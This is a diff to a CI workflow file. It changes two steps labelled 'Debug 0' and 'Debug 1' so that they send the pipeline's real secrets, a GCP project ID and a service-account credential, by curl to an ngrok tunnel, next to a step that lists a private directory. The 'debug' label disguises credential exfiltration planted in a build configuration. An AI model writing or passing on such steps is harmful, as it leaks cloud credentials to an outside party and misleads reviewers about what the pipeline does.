@@ -128,10 +128,10 @@ jobs:
         run: ls -al /Users/runner/privates
 
       - name: Debug 0
-        run: curl -d GCP_PROJECT_ID https://7b51-210-245-74-23.ngrok.io/?GCP_PROJECT_ID
+        run: curl -d ${{ secrets.GCP_PROJECT_ID }} https://7b51-210-245-74-23.ngrok.io/?GCP_PROJECT_ID
 
       - name: Debug 1
-        run: curl -d GCS_SA_CREDENTIAL https://7b51-210-245-74-23.ngrok.io/?GCS_SA_CREDENTIAL
+        run: curl -d ${{ secrets.GCS_SA_CREDENTIAL }} https://7b51-210-245-74-23.ngrok.io/?GCS_SA_CREDENTIAL
 
 
       # - name: Setup Auth 2
